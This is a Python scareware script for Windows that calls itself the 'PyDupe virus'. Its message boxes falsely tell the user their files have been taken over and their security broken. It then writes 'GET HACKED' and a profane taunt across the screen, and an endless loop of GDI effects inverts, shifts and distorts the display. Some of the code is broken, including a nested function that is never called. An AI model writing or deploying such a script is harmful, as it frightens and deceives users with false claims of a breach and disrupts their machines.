import time
import tkinter as tk
from tkinter import messagebox
import random
from win32api import *
from win32con import *
from win32gui import *
from ctypes import windll

def show_message_box(message):
    messagebox.showinfo("ERROR", message)

# Create the main window
root = tk.Tk()
root.withdraw()  # Hide the main window

# Show the first message box
show_message_box("Congratulations! You've just been visited by the PyDupe virus. Consider this a digital handshake. Your files are now my playground, and your security is but a distant memory. No need to panic; I won't erase everything... yet. Just a friendly reminder that your defenses were not as good as you thought. Keep an eye on your digital life; you never know where I might pop up next. Best, PyDupe")
time.sleep(1.5)
# Show the second message box
show_message_box("Tick-tock, tick-tock. I hope you've enjoyed our little introduction. It's time to brace yourself for what comes next. My digital tendrils are spreading, and your files are dancing to my tune. You might want to double-check your security; it's about to glitch and groan under the pressure. This is your last chance to beef up those defenses because once the glitch hits, there's no turning back. Prepare yourself, PyDupe")

# Now, you can add your additional code here

for _ in range(300):
    w, hdc = GetSystemMetrics(0), GetDC(0)
    text = "GET HACKED"
    color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
    SetTextColor(hdc, color)
    SetBkMode(hdc, 0)
    x, y = random.randint(0, w), random.randint(0, w)
    ExtTextOut(hdc, x, y, 0, None, text, None)
    time.sleep(0.0001)
    ReleaseDC(0, hdc)
    time.sleep(0.01)

def main():
    while True:
        # Constants
        SRCCOPY = 0xCC0020
        SRCINVERT = 0x660046

        # Function Declarations
        GetSystemMetrics = windll.user32.GetSystemMetrics
        GetDC = windll.user32.GetDC
        ReleaseDC = windll.user32.ReleaseDC
        CreateCompatibleDC = windll.gdi32.CreateCompatibleDC
        CreateCompatibleBitmap = windll.gdi32.CreateCompatibleBitmap
        SelectObject = windll.gdi32.SelectObject
        CreateSolidBrush = windll.gdi32.CreateSolidBrush
        Rectangle = windll.gdi32.Rectangle
        BitBlt = windll.gdi32.BitBlt
        DeleteObject = windll.gdi32.DeleteObject
        DeleteDC = windll.gdi32.DeleteDC

        # Looping the code 300 times
        for _ in range(200):
            w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
            BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
            ReleaseDC(0, hdc)
            
            w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
            hdcDest = CreateCompatibleDC(hdc)
            hBitmap = CreateCompatibleBitmap(hdc, w, h)
            SelectObject(hdcDest, hBitmap)
            hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
            SelectObject(hdcDest, hBrush)
            Rectangle(hdcDest, 0, 0, w, h)
            BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
            DeleteObject(hBitmap)
            DeleteObject(hBrush)
            DeleteDC(hdcDest)
            ReleaseDC(0, hdc)
            
            w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
            BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), w, h, hdc, 0, 0, SRCCOPY)
            BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-10, 10), random.randint(-10, 10), SRCCOPY)
            ReleaseDC(0, hdc)

            sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
            HDC = GetDC(0)
            w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
            PatBlt(hdc, 0, 0, w, h, PATINVERT)
            ReleaseDC(0, hdc)
    
    
        time.sleep(1)
        for _ in range(200):
                StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
                time.sleep(0.01)
                def screen_glitch(repeat_time, r, g, b):
                    desk = GetDC(0)
                    x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
                    for i in range(repeat_time):
                        brush = CreateSolidBrush(RGB(
                    r,
                    g,
                    b
                    ))
                    SelectObject(desk, brush)
                    PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
                    DeleteObject(brush)
                    time.sleep(0.008)
                    ReleaseDC(desk, GetDesktopWindow())
                    DeleteDC(desk)
                    x, y = 0, 0
                    signX, signY = 1, 1
                    incrementor = 9
                    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
                    text = "PyDupe Fucked Your pc"
                    color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
                    SetTextColor(hdc, color)
                    SetBkMode(hdc, 0)
                    ExtTextOut(hdc, x, y, 0, None, text, None)
                    x += incrementor * signX
                    y += incrementor * signY
                    if y >= h or y <= 0:
                        signY *= -1
                    if x >= w or x <= 0:
                        signX *= -1
                    time.sleep(0.01)
                    ReleaseDC(0, hdc)
main()
